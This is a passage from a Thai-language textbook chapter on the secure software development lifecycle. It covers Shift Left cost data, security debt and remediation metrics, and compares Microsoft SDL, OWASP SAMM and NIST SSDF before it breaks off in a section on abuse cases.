# CH-3: Secure Software Development Lifecycle (SDLC)



---

## วัตถุประสงค์การเรียนรู้

เมื่อจบบทนี้นักศึกษาสามารถ:

1. อธิบายแนวคิด Shift Left Security และวิเคราะห์ต้นทุนในการแก้ไขข้อบกพร่องในแต่ละขั้นของ SDLC พร้อมยกตัวอย่างข้อมูลจากงานวิจัย
2. เปรียบเทียบโมเดล Secure SDLC ที่สำคัญ (Microsoft SDL, OWASP SAMM, NIST SSDF SP 800-218) ในแง่ของโครงสร้าง จุดเด่น และความเหมาะสมกับการปรับใช้
3. อธิบายกิจกรรมด้านความปลอดภัยในแต่ละขั้นของ SDLC ตั้งแต่ Requirements ถึง Operations พร้อมระบุเครื่องมือและแนวปฏิบัติที่ดี
4. ออกแบบและอธิบายการบูรณาการ Security Tools ใน CI/CD Pipeline ตามแนวคิด DevSecOps
5. ประยุกต์ใช้ Security Requirements Engineering, Abuse Cases, Security Stories และ Security Acceptance Criteria ในการพัฒนาซอฟต์แวร์

---

## เนื้อหา

### 3.1 แนวคิด Shift Left Security

Shift Left Security เป็นแนวคิดในการ "ย้าย" (Shift) กิจกรรมด้านความปลอดภัยไปยังช่วงต้น (Left) ของกระบวนการพัฒนาซอฟต์แวร์ (SDLC) แทนที่จะปล่อยให้ความปลอดภัยเป็นสิ่งที่ต้องมาตรวจสอบท้ายสุดก่อนหรือหลังการDeploy (Deploy) คำว่า "Shift Left" มาจากการเปรียบเทียบ SDLC เป็นเส้นเวลาจากซ้ายไปขวา — ยิ่งอยู่ซ้ายมากเท่าไหร่ ยิ่งเป็นช่วงต้นของโครงการมากเท่านั้น

#### 3.1.1 ความเป็นมาและความสำคัญ

แนวคิด Shift Left มีรากฐานมาจากหลักการทางวิศวกรรมที่ว่า "ยิ่งค้นพบข้อบกพร่องช้าเท่าไหร่ ต้นทุนในการแก้ไขยิ่งสูงขึ้นเท่านั้น" ซึ่งได้รับการยืนยันจากงานวิจัยหลายชิ้น:

- **IBM Systems Sciences Institute (อ้างอิงใน Dawson et al., 2010):** รายงานว่าต้นทุนในการแก้ไขข้อบกพร่อง (Bug) เพิ่มขึ้นแบบทวีคูณ (Exponential) ตามขั้นตอนของ SDLC — การแก้ไขข้อบกพร่องในช่วง Maintenance (หลัง deploy) มีต้นทุนสูงกว่าการแก้ไขในช่วง Design ถึง 100 เท่า
- **NASA (2010) — การศึกษาจาก 3 วิธี:** การศึกษาของ NASA เรื่อง "The Relative Cost of Fixing Errors" ใช้ 3 วิธีในการคำนวณ (Bottom-Up Cost, Total Costs Breakdown, Top-Down Hypothetical Project) พบว่าต้นทุนในการแก้ไข Requirements Error หากตรวจพบในช่วง Requirements = 1 หน่วย เมื่อตรวจพบในช่วง Design = 3–8 หน่วย, ในช่วง Build = 7–16 หน่วย, ในช่วง Integration & Test = 21–78 หน่วย, และในช่วง Operations = 29 ถึงมากกว่า 1,500 หน่วย
- **IBM Rational (2008):** รายงานว่าต้นทุนในการแก้ไขข้อบกพร่องหลัง Release สูงกว่าการแก้ไขในช่วง Design และ Architecture ถึง 30 เท่า

โดยทั่วไปมักอ้างอิงตัวเลขจาก IBM Systems Sciences Institute ดังนี้:

| ขั้นตอนที่พบข้อบกพร่อง | ต้นทุนสัมพัทธ์ (เทียบกับ Requirements) |
|----------------------|--------------------------------------|
| Requirements | 1 เท่า ($1) |
| Design | 6 เท่า ($6) |
| Coding / Implementation | 15 เท่า ($15) |
| Testing (QA) | 60 เท่า ($60) |
| Deployment / Production | 100+ เท่า ($100+) |

> **หมายเหตุ:** ตัวเลขข้างต้นเป็นตัวเลขโดยประมาณ (Relative Cost) ที่ใช้ในการอ้างอิงทั่วไป ตัวเลขจริงอาจแตกต่างกันไปตามความซับซ้อนของโครงการ ประเภทของซอฟต์แวร์ และเครื่องมือที่ใช้ แต่งานวิจัยทั้งหมดสอดคล้องกันว่าต้นทุนเพิ่มขึ้นแบบทวีคูณ (Exponential) ไม่ใช่เชิงเส้น (Linear)

**สาเหตุที่ต้นทุนเพิ่มขึ้นแบบทวีคูณ:**

1. **การค้นพบช้า → ต้องย้อนกลับหลายขั้น:** เมื่อพบข้อบกพร่องในช่วง Testing หรือ Deployment ต้องย้อนกลับไปแก้ไขที่ Requirements, Design, และ Code — แต่ละขั้นต้องใช้เวลาและทรัพยากร
2. **ผลกระทบต่อระบบอื่น:** การเปลี่ยนแปลงในช่วงท้ายอาจส่งผลกระทบต่อ Component และ Integration กับระบบอื่นๆ ที่พัฒนาไปแล้ว
3. **ค่าใช้จ่ายในการ Regression Testing:** ทุกครั้งที่แก้ไข ต้องทำการทดสอบซ้ำทั้งหมด
4. **ต้นทุนด้านชื่อเสียงและกฎหมาย:** ข้อบกพร่องด้านความปลอดภัยที่ถูกค้นพบใน Production อาจนำไปสู่การละเมิดข้อมูล (Data Breach) ค่าปรับตามกฎหมาย และความเสียหายต่อชื่อเสียง
5. **ค่าใช้จ่ายในการ Hotfix/Emergency Patch:** การแก้ไขด่วน (Hotfix) ใน Production มีต้นทุนสูงกว่าการแก้ไขตามรอบปกติ (Normal Release Cycle)

#### 3.1.2 Traditional SDLC vs Secure SDLC

| มิติ | Traditional SDLC | Secure SDLC |
|------|-----------------|-------------|
| **การคิดถึงความปลอดภัย** | ทีหลัง (Afterthought) — มักทำเฉพาะก่อน Deploy หรือเมื่อมีปัญหา | ตั้งแต่ต้น (Built-in) — ทุกขั้นตอนมีกิจกรรมด้านความปลอดภัย |
| **ทีมรับผิดชอบ** | เฉพาะ Security Team | Everyone — Developer, QA, DevOps, Security ร่วมมือกัน |
| **การทดสอบความปลอดภัย** | ทำครั้งเดียวก่อน Release | ทำอย่างต่อเนื่องในทุก Sprint / ทุก Commit |
| **เครื่องมือ** | Manual Penetration Testing เป็นหลัก | Automation: SAST, DAST, SCA, IaC Scanning ใน CI/CD |
| **วัฒนธรรม** | Security "ปิดกั้น" การพัฒนา (Gatekeeper) | Security "อำนวยความสะดวก" ให้พัฒนาอย่างปลอดภัย (Enablement) |
| **การวัดผล** | จำนวนช่องโหว่ที่พบก่อน Release | Mean Time to Remediate, Security Debt, จำนวนช่องโหว่ใน Production |
| **ความเร็ว** | Security เป็นคอขวด (Bottleneck) — ชะลอการ Release | Security ถูกทำงานอัตโนมัติ — ไม่ชะลอการ Release |
| **ต้นทุนระยะยาว** | สูง — แก้ไขช่องโหว่ใน Production | ต่ำ — ป้องกันตั้งแต่ต้น |

#### 3.1.3 Security Debt

Security Debt เป็นแนวคิดที่ได้รับแรงบันดาลใจจาก Technical Debt — หมายถึง "หนี้" ด้านความปลอดภัยที่สะสมจากการตัดสินใจทางวิศวกรรมที่ให้ความสำคัญกับความเร็วมากกว่าความปลอดภัย เช่น:

- การไม่แก้ไขช่องโหว่ที่ค้นพบ (Deferring Fixes)
- การใช้ Library เวอร์ชันเก่าที่มีช่องโหว่
- การไม่มี Security Testing ใน CI/CD Pipeline
- การออกแบบระบบโดยไม่ทำ Threat Modeling
- การใช้ Default Configuration ที่ไม่ปลอดภัย

**การวัด Security Debt:**

| ตัวชี้วัด | คำอธิบาย |
|----------|----------|
| **Known Vulnerabilities Count** | จำนวนช่องโหว่ที่รู้จักแต่ยังไม่ได้รับการแก้ไข |
| **Critical/High Severity Backlog** | จำนวนช่องโหว่ระดับวิกฤต/สูงที่คั่งค้าง |
| **Patch Lag Time** | ระยะเวลาตั้งแต่มี Patch จนถึงการติดตั้ง |
| **Security Debt Ratio** | สัดส่วนของ Code ที่มีช่องโหว่เทียบกับ Code ทั้งหมด |
| **Days to Remediate (DTR)** | จำนวนวันเฉลี่ยในการแก้ไขช่องโหว่ |

Security Debt มี "ดอกเบี้ย" เช่นเดียวกับ Technical Debt — ยิ่งปล่อยไว้นาน ยิ่งต้องจ่ายดอกเบี้ยสูงขึ้นในรูปของ:
- ความเสี่ยงที่เพิ่มขึ้น (Probability of Breach)
- ต้นทุนในการแก้ไขที่สูงขึ้น (ถ้ายิ่งช้า ยิ่งแก้ยาก)
- ค่าใช้จ่ายในการ Compliance (ถ้าต้อง Audit ย้อนหลัง)
- การสูญเสียความเชื่อมั่นของลูกค้าและผู้มีส่วนได้ส่วนเสีย

#### 3.1.4 Mean Time to Remediate (MTTR)

Mean Time to Remediate หรือ MTTR เป็นตัวชี้วัดสำคัญใน Secure SDLC — วัดระยะเวลาโดยเฉลี่ยตั้งแต่การค้นพบช่องโหว่จนถึงการแก้ไขเสร็จสมบูรณ์

**ข้อมูลจาก Edgescan Vulnerability Statistics Report 2024:**
- MTTR เฉลี่ยสำหรับช่องโหว่ความรุนแรงสูง (CVSS >= 7.0) ทั่วทุกอุตสาหกรรม = 46–117 วัน ขึ้นอยู่กับประเภทของช่องโหว่
- ช่องโหว่ที่มี EPSS (Exploit Prediction Scoring System) สูง (>0.8) มี MTTR ต่ำกว่าช่องโหว่ทั่วไป — แสดงว่าองค์กรให้ความสำคัญกับช่องโหว่ที่กำลังถูกโจมตีจริง
- อุตสาหกรรมที่มี MTTR ต่ำที่สุด: Financial Services (โดยเฉพาะ KEV มี MTTR < 7 วัน)
- อุตสาหกรรมที่มี MTTR สูง: Healthcare (บางช่องโหว่ใช้เวลาเฉลี่ย 244 วัน — ข้อมูลจาก Cobalt State of Pentesting 2025)

**ข้อมูลจาก CISA Known Exploited Vulnerabilities (KEV) Catalog:**
- หน่วยงาน Federal ต้องแก้ไข KEV ภายใน 7 วัน (ตาม BOD 22-01)
- จาก Tenable Research 2025: แม้ Government Sector จะมีข้อบังคับ 7 วัน แต่ค่าเฉลี่ยการแก้ไข KEV ในบางกรณีอยู่ที่ 116 วัน

**แนวทางการตั้งค่า SLO (Service Level Objective) สำหรับ MTTR:**

| ความรุนแรง | SLO ที่แนะนำ |
|-----------|-------------|
| KEV / กำลังถูกโจมตี | ≤ 7 วัน (Internet-facing: ≤ 72 ชั่วโมง) |
| Critical (CVSS 9.0+) | ≤ 14 วัน |
| High (CVSS 7.0–8.9) | ≤ 30 วัน |
| Medium (CVSS 4.0–6.9) | ≤ 60–90 วัน |
| Low (CVSS 0.1–3.9) | ≤ 120 วัน หรือรอบ Major Release ถัดไป |

**ความสัมพันธ์ระหว่าง Shift Left กับ MTTR:**
- ยิ่ง Shift Left มากเท่าไหร่ = ยิ่งพบช่องโหว่เร็ว = MTTR ยิ่งต่ำ
- การค้นพบช่องโหว่ในช่วง Development (SAST) มี MTTR ต่ำกว่าในช่วง Production (Pen Test) อย่างมีนัยสำคัญ
- การทำ Security Automation ใน CI/CD Pipeline ช่วยลด MTTR จากระดับสัปดาห์/เดือน เป็นระดับชั่วโมง/วัน

---

### 3.2 โมเดล Secure SDLC ที่สำคัญ

มีโมเดล Secure SDLC ที่เป็นที่ยอมรับในระดับสากล 3 โมเดลหลัก ได้แก่ Microsoft SDL, OWASP SAMM, และ NIST SSDF (SP 800-218) แต่ละโมเดลมีจุดเด่นและแนวทางที่แตกต่างกัน

#### 3.2.1 Microsoft SDL (Security Development Lifecycle)

Microsoft SDL เกิดจากวิกฤตความเชื่อมั่นด้านความปลอดภัยของ Microsoft ในช่วงต้นทศวรรษ 2000 — โดยเฉพาะหลังจาก Bill Gates ส่ง memo "Trustworthy Computing" ถึงพนักงานทุกคนในวันที่ 15 มกราคม 2002 (อ้างอิง: Microsoft, "The Trustworthy Computing Memo," 2002) โดยประกาศให้ความปลอดภัยเป็น "ลำดับความสำคัญสูงสุด" (Highest Priority)

Microsoft SDL ฉบับแรกได้รับการพัฒนาโดย Michael Howard และ Steve Lipner จาก Microsoft และเผยแพร่ในปี 2004 — ปัจจุบันเวอร์ชันล่าสุดคือ 5.2 (เผยแพร่ 15 กรกฎาคม 2024) และ Microsoft ได้พัฒนาไปสู่ "Continuous SDL" (มีนาคม 2024) เพื่อรองรับการพัฒนาแบบ Cloud-Native และ CI/CD

**7 ขั้นตอนของ Microsoft SDL:**

**Phase 1: Core Security Training (การฝึกอบรมความปลอดภัยพื้นฐาน)**
- นักพัฒนาทุกคนต้องผ่านการอบรมความปลอดภัยพื้นฐาน 
- เนื้อหาครอบคลุม: Secure Design, Threat Modeling, Secure Coding, Security Testing, Privacy
- Microsoft จัดทำ "Essential Software Security Training" สำหรับนักพัฒนา
- มี "SDL Banned Function Calls" — รายชื่อฟังก์ชันที่ห้ามใช้ (เช่น `strcpy`, `gets`, `strcat`)
- **Output:** พนักงานทุกคนที่เกี่ยวข้องผ่านการอบรม (Training Record)

**Phase 2: Requirements (การกำหนดความต้องการ)**
- กำหนด Security Requirements และ Privacy Requirements ตั้งแต่เริ่มโครงการ
- ทีมงานต้องทำ Security Risk Assessment และ Privacy Impact Assessment
- กำหนดระดับความรุนแรงของความปลอดภัย (Security Bug Bar) — กำหนดว่า Bug แบบไหนต้องแก้ก่อน Release
- กำหนด Security Quality Gates — เกณฑ์ขั้นต่ำที่ต้องผ่านก่อน Release
- สร้าง Security Requirements Specification
- **Output:** Security Requirements Document, Bug Bar Definition, Risk Assessment Report

**Phase 3: Design (การออกแบบ)**
- ทำ Threat Modeling โดยใช้ STRIDE methodology
- กำหนด Design Requirements ด้านความปลอดภัย
- ระบุ Attack Surface — วิเคราะห์จุดที่ผู้โจมตีสามารถเข้าถึงได้
- กำหนด Cryptographic Standards — ใช้อัลกอริทึมที่ Microsoft รับรองเท่านั้น (เช่น AES, SHA-256)
- ทำ Architecture Review ก่อนเริ่ม Coding
- **เครื่องมือ:** Microsoft Threat Modeling Tool (ฟรี, เปิดตัวปี 2005, อัปเดตล่าสุด 2024)
- **Output:** Threat Model Diagram, Attack Surface Analysis Report, Design Specification

**Phase 4: Implementation (การพัฒนา)**
- ใช้ Secure Coding Guidelines ของ Microsoft
- ห้ามใช้ฟังก์ชันที่อยู่ใน Banned Function Calls List
- ใช้ Static Analysis Tools — Microsoft ใช้ PREfast (สำหรับ C/C++) และ FxCop (สำหรับ .NET) ปัจจุบันใช้ Roslyn Analyzers
- ใช้การตรวจสอบเวอร์ชันของ Dependency และ Library
- ทำ Code Review โดยผู้ที่ไม่ใช่เจ้าของ Code (Separation of Duties)
- **Output:** Code ที่ผ่าน SAST Scan, Code Review Log

**Phase 5: Verification (การตรวจสอบ)**
- ทำ Dynamic Analysis (Fuzz Testing) — โดยเฉพาะสำหรับโปรแกรมที่รับ Input จากผู้ใช้
- ทำ Penetration Testing (Security Push) — ทีมแฮกเกอร์ของ Microsoft (Microsoft Red Team) ทดสอบระบบ
- ตรวจสอบ Attack Surface Reduction — ดูว่ายังมีฟังก์ชัน/บริการที่ไม่จำเป็นเปิดอยู่หรือไม่
- ทดสอบ Security Features ว่าทำงานถูกต้อง
- **Output:** Fuzz Test Results, Pen Test Report, Final Security Review

**Phase 6: Release (การปล่อย)**
- ทำ Final Security Review (FSR) — ผู้บริหารต้องอนุมัติ
- ทำ Privacy Review — ตรวจสอบการจัดการข้อมูลส่วนบุคคล
- สร้าง Incident Response Plan — แผนรับมือเมื่อพบช่องโหว่หลัง Release
- จัดทำเอกสารการติดตั้งและ Deploy อย่างปลอดภัย
- **Safe Deployment Process (SDP):** Release แบบค่อยเป็นค่อยไป
  - Ring 0: ทีมพัฒนาที่รับผิดชอบ
  - Ring 1: พนักงาน Microsoft ทั้งหมด
  - Ring 2: ลูกค้าที่เลือกใช้ Targeted Release Channel
  - Ring 3: ทั่วโลก (Worldwide)
- **Output:** Final Security Review Sign-off, Incident Response Plan, SBOM

**Phase 7: Response (การตอบสนอง)**
- จัดตั้ง Product Security Incident Response Team (PSIRT)
- ดำเนินการตาม Incident Response Plan เมื่อพบช่องโหว่
- ออก Security Advisory และ Security Update
- วิเคราะห์ Root Cause — ป้องกันไม่ให้เกิดซ้ำ
- **Output:** Security Bulletin, Patch/Update, Post-Incident Review

**ผลลัพธ์จากการใช้ SDL ของ Microsoft:**

| ผลิตภัณฑ์ | ผลลัพธ์ | ที่มา |
|----------|---------|------|
| Windows Server 2003 (เทียบกับ Windows 2000) | ลดจำนวน Critical/Important Vulnerabilities ได้ 63% ในปีแรก | Microsoft SDL FAQ |
| Internet Information Services (IIS) 6.0 | มีเพียง 1 Security Vulnerability หลัง Release (และเป็น Feature ที่ปิดโดย Default) | ZDNet, 2005 |
| SQL Server 2005 | 0 Vulnerabilities ใน 24 เดือน (หลังจาก Service Pack 3) | Microsoft SDL Progress Report |
| โดยรวม (2004–2010) | ลด Security Defects ได้ 50–60% | MSDN Magazine, 2005 |

#### 3.2.2 OWASP SAMM (Software Assurance Maturity Model)

OWASP SAMM เป็นโมเดลการประเมินวุฒิภาวะ (Maturity Model) สำหรับการสร้างหลักประกันด้านความปลอดภัยของซอฟต์แวร์ พัฒนาโดย OWASP (Open Web Application Security Project) เวอร์ชันแรก (v1.0) เขียนโดย Pravir Chandra ในปี 2009 เวอร์ชันปัจจุบันคือ v2.0 (เผยแพร่ 31 มกราคม 2020)

**ปรัชญาของ SAMM:**
- SAMM เป็น **Prescriptive Model** — บอกว่าองค์กร "ควรทำอะไร" ในแต่ละระดับวุฒิภาวะ
- เป็น **Risk-Driven** — ให้องค์กรเลือกให้ความสำคัญกับสิ่งที่เหมาะสมกับความเสี่ยงของตน
- เป็น **Technology and Process Agnostic** — ใช้ได้กับทุกเทคโนโลยีและทุกกระบวนการพัฒนา
- SAMM v2.0 เปลี่ยนจาก v1.5 อย่างมีนัยสำคัญ: สร้าง Business Function "Implementation" ใหม่, ยกเลิก "Operational Enablement", และปรับปรุง Verification

**โครงสร้างของ OWASP SAMM v2.0:**

SAMM ประกอบด้วย 5 Business Functions แต่ละ Function มี 3 Security Practices รวม 15 Practices แต่ละ Practice มี 3 Maturity Levels (1–3) และแต่ละ Practice แบ่งเป็น 2 Streams (A และ B):

| Business Function | Security Practices | คำอธิบาย |
|-------------------|-------------------|----------|
| **Governance** | Strategy & Metrics, Policy & Compliance, Education & Guidance | การจัดการ, วางแผน, และวัดผลด้านความปลอดภัยของซอฟต์แวร์ |
| **Design** | Threat Assessment, Security Requirements, Secure Architecture | การออกแบบระบบโดยคำนึงถึงความปลอดภัย |
| **Implementation** | Secure Build, Secure Deployment, Defect Management | การพัฒนาที่ปลอดภัยและการจัดการข้อบกพร่อง |
| **Verification** | Architecture Assessment, Requirements-Driven Testing, Security Testing | การตรวจสอบและทดสอบความปลอดภัย |
| **Operations** | Incident Management, Environment Management, Operational Management | การดำเนินงานและการตอบสนองต่อเหตุการณ์ |

**รายละเอียดแต่ละ Security Practice:**

**Governance:**
1. **Strategy & Metrics:** กำหนดกลยุทธ์ด้านความปลอดภัยของซอฟต์แวร์ กำหนด KPI และวัดผล
2. **Policy & Compliance:** กำหนดนโยบายความปลอดภัย และปฏิบัติตามข้อกำหนดทางกฎหมาย
3. **Education & Guidance:** อบรมและให้คำแนะนำด้านความปลอดภัยแก่ทีมพัฒนา

**Design:**
1. **Threat Assessment:** ระบุและประเมินภัยคุกคามต่อระบบ (Threat Modeling)
2. **Security Requirements:** กำหนด Requirements ด้านความปลอดภัย
3. **Secure Architecture:** ออกแบบสถาปัตยกรรมที่ปลอดภัย

**Implementation:**
1. **Secure Build:** สร้าง Build Process ที่ปลอดภัย (Supply Chain Security)
2. **Secure Deployment:** กำหนดค่า Deployment และ Environment ให้ปลอดภัย
3. **Defect Management:** จัดการข้อบกพร่องด้านความปลอดภัยอย่างเป็นระบบ

**Verification:**
1. **Architecture Assessment:** ตรวจสอบความถูกต้องของ Architecture Design
2. **Requirements-Driven Testing:** ทดสอบตาม Requirements ด้านความปลอดภัย
3. **Security Testing:** ทดสอบความปลอดภัย (SAST, DAST, Pen Test)

**Operations:**
1. **Incident Management:** จัดการเหตุการณ์ด้านความปลอดภัย
2. **Environment Management:** จัดการ Hardening และ Patch Management
3. **Operational Management:** จัดการการดำเนินงานด้านความปลอดภัย

**การประเมินวุฒิภาวะใน SAMM:**
- **Level 0:** ยังไม่เริ่มทำ (No activity)
- **Level 1:** ทำแบบไม่เป็นทางการ (Initial / Ad-hoc)
- **Level 2:** ทำอย่างเป็นระบบ (Structured / Consistent)
- **Level 3:** ทำอย่างมีประสิทธิภาพและเป็นอัตโนมัติ (Optimized / Automated)

#### 3.2.3 NIST SSDF SP 800-218 (Secure Software Development Framework)

NIST SSDF (Secure Software Development Framework) ถูกพัฒนาขึ้นเพื่อตอบสนองต่อ Executive Order (EO) 14028 ของประธานาธิบดีสหรัฐฯ เรื่อง "Improving the Nation's Cybersecurity" (12 พฤษภาคม 2021) ซึ่งกำหนดให้ NIST พัฒนากรอบแนวทางสำหรับการพัฒนาซอฟต์แวร์ที่ปลอดภัย

เวอร์ชันแรก (v1.0) เผยแพร่เป็น White Paper ในเดือนเมษายน 2020 และเวอร์ชัน 1.1 (ปัจจุบัน) เผยแพร่เป็น NIST Special Publication 800-218 ในเดือนกุมภาพันธ์ 2022 ( authors: Scarfone, K., Souppaya, M., & Dodson, D.)

ในเดือนกุมภาพันธ์ 2024 NIST ได้เผยแพร่ SP 800-218A เพิ่มเติมสำหรับ Secure Software Development Practices for Generative AI and Dual-Use Foundation Models

**โครงสร้างของ NIST SSDF (4 Groups, 19 Practices):**

**กลุ่ม PO: Prepare the Organization (เตรียมความพร้อมองค์กร)**
| Practice | Tasks สำคัญ |
|----------|-------------|
| PO.1: Define Security Requirements for Software Development | กำหนด Security Requirements จาก Policy ภายใน + กฎหมายภายนอก |
| PO.2: Implement Roles and Responsibilities | กำหนดบทบาทหน้าที่ด้านความปลอดภัยให้ชัดเจน |
| PO.3: Implement Supporting Toolchains | ใช้ Automation Toolchain เพื่อลด Human Effort และเพิ่มความแม่นยำ |
| PO.4: Define and Use Criteria for Software Security Checks | กำหนด Criteria สำหรับการตรวจสอบความปลอดภัย |
| PO.5: Implement and Maintain Secure Environments for Software Development | ปกป้อง Development Environment (Dev, Build, Test, Distribution) |

**กลุ่ม PS: Protect the Software (ปกป้องซอฟต์แวร์)**
| Practice | Tasks สำคัญ |
|----------|-------------|
| PS.1: Protect All Forms of Code from Unauthorized Access and Tampering | ปกป้อง Source Code และ Build Artifacts |
| PS.2: Provide a Mechanism for Verifying Software Release Integrity | ให้กลไกตรวจสอบ Integrity ของ Release (Code Signing, SBOM) |
| PS.3: Archive and Protect Each Software Release | เก็บ Software Release อย่างปลอดภัย (สามารถย้อนกลับได้) |

**กลุ่ม PW: Produce Well-Secured Software (ผลิตซอฟต์แวร์ที่ปลอดภัย)**
| Practice | Tasks สำคัญ |
|----------|-------------|
| PW.1: Design Software to Meet Security Requirements | ออกแบบตาม Security Requirements — ทำ Threat Modeling |
| PW.2: Review Software Design to Verify Compliance with Security Requirements | ตรวจสอบ Design ว่าตรงตาม Security Requirements |
| PW.3: Reuse Existing, Well-Secured Software When Feasible | ใช้ซอฟต์แวร์ที่ปลอดภัยที่มีอยู่แล้ว — จัดการ Dependency |
| PW.4: Create Source Code by Adhering to Secure Coding Practices | เขียน Code ตาม Secure Coding Practices |
| PW.5: Review Source Code to Identify and Remove Vulnerabilities | Review Code เพื่อค้นหาและกำจัดช่องโหว่ |
| PW.6: Test Software to Identify and Remove Vulnerabilities | ทดสอบซอฟต์แวร์เพื่อหาช่องโหว่ (SAST, DAST, Fuzz) |
| PW.7: Test Software to Identify and Remove Vulnerabilities in Built executables | ทดสอบที่ Binary/Executable level |
| PW.8: Configure Software and Build Processes for Secure Deployment | กำหนดค่า Build Process และ Deployment ให้ปลอดภัย |

**กลุ่ม RV: Respond to Vulnerabilities (ตอบสนองต่อช่องโหว่)**
| Practice | Tasks สำคัญ |
|----------|-------------|
| RV.1: Identify and Confirm Vulnerabilities | ระบุและยืนยันช่องโหว่ — มีกระบวนการรับรายงานจากภายนอก |
| RV.2: Assess, Prioritize, and Remediate Vulnerabilities | ประเมิน จัดลำดับ และแก้ไขช่องโหว่ |
| RV.3: Analyze Vulnerabilities to Identify Their Root Causes | วิเคราะห์ Root Cause ของช่องโหว่ |
| RV.4: Communicate Vulnerabilities to Relevant Parties | แจ้งข้อมูลช่องโหว่ให้ผู้เกี่ยวข้องทราบ |
| RV.5: Coordinate with External Parties | ประสานงานกับหน่วยงานภายนอก (CERT, CISA, ผู้ใช้งาน) |

#### 3.2.4 ตารางเปรียบเทียบ Microsoft SDL vs OWASP SAMM vs NIST SSDF

| มิติ | Microsoft SDL | OWASP SAMM v2.0 | NIST SSDF SP 800-218 |
|------|---------------|-----------------|----------------------|
| **ผู้พัฒนา** | Microsoft | OWASP Community | NIST (US Government) |
| **ปีแรกที่เผยแพร่** | 2004 (v5.2: 2024) | 2009 (v2.0: 2020) | 2020 (v1.1: 2022) |
| **ประเภท** | Process Model (ขั้นตอน) | Maturity Model (วุฒิภาวะ) | Framework (กรอบแนวทาง) |
| **Prescriptive/Descriptive** | Prescriptive | Prescriptive | Descriptive (outcome-based) |
| **จำนวนขั้นตอน/กลุ่ม** | 7 Phases | 5 Business Functions + 15 Practices | 4 Groups + 19 Practices |
| **จุดเน้น** | ขั้นตอนที่ต้องทำในแต่ละ Phase | การประเมินและพัฒนาวุฒิภาวะ | ผลลัพธ์ที่ต้องบรรลุ (Outcome) |
| **ความยืดหยุ่น** | ปานกลาง — มีขั้นตอนชัดเจนต่อเนื่อง | สูง — เลือกให้ความสำคัญตาม Risk | สูง — ไม่กำหนดวิธีการ |
| **การวัดผล** | Security Bug Bar, Quality Gates | Maturity Level (0–3) | Task Completion |
| **การปรับใช้ใน Agile** | Continuous SDL (2024) | สนับสนุนโดย Design | ไม่จำกัดกระบวนการ |
| **การรับรอง (Certification)** | ไม่มีการรับรองบุคคล | SAMM Assessment (องค์กร) | ไม่มีการรับรอง |
| **การอ้างอิงในกฎหมาย** | เอกสารอ้างอิงทั่วไป | ใช้เป็นกรอบประเมินองค์กร | อ้างอิงใน EO 14028 |
| **เครื่องมือสนับสนุน** | Threat Modeling Tool, PREfast, FxCop | SAMM Toolbox (Assessment + Roadmap) | SSDF Mapping Tables |
| **เหมาะสมกับ** | องค์กรที่ต้องการ Process ที่ชัดเจน | องค์กรที่ต้องการ Maturity Baseline | องค์กรที่ต้องการ Compliance ตามมาตรฐานรัฐบาล |

#### 3.2.5 การปรับใช้ Secure SDLC ใน Agile vs Waterfall

**Waterfall (Traditional):**
- แต่ละ Phase ทำตามลำดับ — Security Activities ทำตาม Phase นั้นๆ
- Threat Modeling ทำในช่วง Design, SAST ทำในช่วง Development, Pen Test ทำในช่วง Testing
- **ข้อดี:** มี Gate/Checkpoint ชัดเจน — ทำ FSR ก่อน Release ทุกครั้ง
- **ข้อเสีย:** พบช่องโหว่ช้า — ต้องรอถึง Testing Phase

**Agile (Scrum/Kanban):**
- Security Activities ต้องถูก "บีบ" ให้อยู่ใน Sprint (2–4 สัปดาห์)
- **Security Stories:** เขียนเป็น User Story ด้านความปลอดภัย — เช่น "As a user, I want my password to be hashed so that it cannot be read by attackers"
- **Security Acceptance Criteria:** เพิ่ม Acceptance Criteria ด้านความปลอดภัยในทุก Story
- **Threat Modeling แบบ Lightweight:** ทำ Threat Modeling เฉพาะ Feature ใหม่ใน Sprint Planning
- **Automated Security Testing:** SAST/DAST/SCA ต้องทำงานทุก Sprint (ทุก Commit)
- **Security Champion:** แต่ละทีมต้องมี "Security Champion" ที่เป็นจุดติดต่อด้านความปลอดภัย

**แนวทาง Hybrid (Recommended):**
- ใช้ Agile สำหรับการพัฒนา Feature (Sprint 2–4 สัปดาห์)
- มี "Security Milestone" ในทุก Release (ทุก 3–6 Sprints) — ทำ Threat Modeling Review, Pen Test, Architecture Review
- ใช้ Automation ให้มากที่สุดใน CI/CD Pipeline
- จัดให้มี "Security Sprint" เป็นระยะ — ทุ่มเท Sprint หนึ่งให้กับการปรับปรุงความปลอดภัย

---

### 3.3 กิจกรรมด้านความปลอดภัยในแต่ละขั้นของ SDLC

#### 3.3.1 Requirements Phase (ขั้นตอนการกำหนดความต้องการ)

**วัตถุประสงค์:** กำหนดความต้องการด้านความปลอดภัย (Security Requirements) ให้ชัดเจนตั้งแต่เริ่มโครงการ เพื่อเป็นแนวทางในการออกแบบ พัฒนา และทดสอบ

**กิจกรรมหลัก:**

**1. Security Requirements Engineering (วิศวกรรมความต้องการด้านความปลอดภัย)**
- วิเคราะห์ความต้องการด้านความปลอดภัยจาก:
  - **นโยบายองค์กร:** นโยบายความปลอดภัยของข้อมูล, นโยบายการควบคุมการเข้าถึง
  - **กฎหมายและข้อบังคับ:** PDPA, GDPR, PCI DSS, HIPAA, SOX
  - **มาตรฐานอุตสาหกรรม:** NIST SP 800-53, ISO 27001, OWASP ASVS
  - **ข้อกำหนดทางธุรกิจ:** ข้อตกลงกับลูกค้า (SLA), ข้อกำหนดด้านความพร้อมใช้งาน
- กำหนด Security Requirements ในรูปแบบที่วัดผลได้ (Measurable)
  
**ตัวอย่าง Security Requirements:**
- ระบบต้องเข้ารหัสข้อมูลขณะส่งด้วย TLS 1.3
- ระบบต้องจัดเก็บรหัสผ่านโดยใช้ Algorithm แบบ One-Way Hashing (Argon2id หรือ bcrypt)
- ระบบต้องบันทึก Audit Log สำหรับทุกการเข้าถึงข้อมูลส่วนบุคคล
- ระบบต้องมีการ Lockout Account หลังจาก Login ล้มเหลว 5 ครั้ง
- ระบบต้องสามารถคืนค่าได้ภายใน 4 ชั่วโมงหลังจาก Disaster

**2. Abuse Cases (กรณีการใช้งานในเชิงลบ)**
Abuse Cases หรือ Misuse Cases เป็นเทคนิคในการระบุว่าผู้โจมตี (Attacker) อาจใช้ระบบในทางที่ผิดอย่างไร — เป็น Complementary ของ Use Cases ปกติ

| Use Case (ปกติ) | Abuse Case (โจมตี) |
|----------------|-------------------|
| ผู้ใช้ Login ด้วย Username/Password | ผู้โจมตี Brute Force Password เพื่อเข้าสู่ระบบ |
